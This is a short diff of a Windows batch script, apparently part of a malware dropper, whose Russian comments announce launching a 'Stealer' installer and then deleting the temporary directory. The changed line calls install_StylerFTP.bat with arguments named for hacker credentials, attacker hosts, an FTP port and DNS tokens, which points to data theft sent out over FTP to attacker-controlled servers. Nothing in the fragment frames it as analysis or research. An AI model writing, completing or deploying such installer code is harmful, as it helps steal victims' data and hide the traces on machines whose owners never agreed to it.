@@ -26,7 +26,7 @@ rem Go to Temprorary Directory
 cd /d %curdir%
 
 rem Запускаем инсталлятор Stealer "Экспонента"
-call install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
+call %LocalFolderZ%\install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
 cd /d %curdir%
 
 rem Удаляем временный каталог
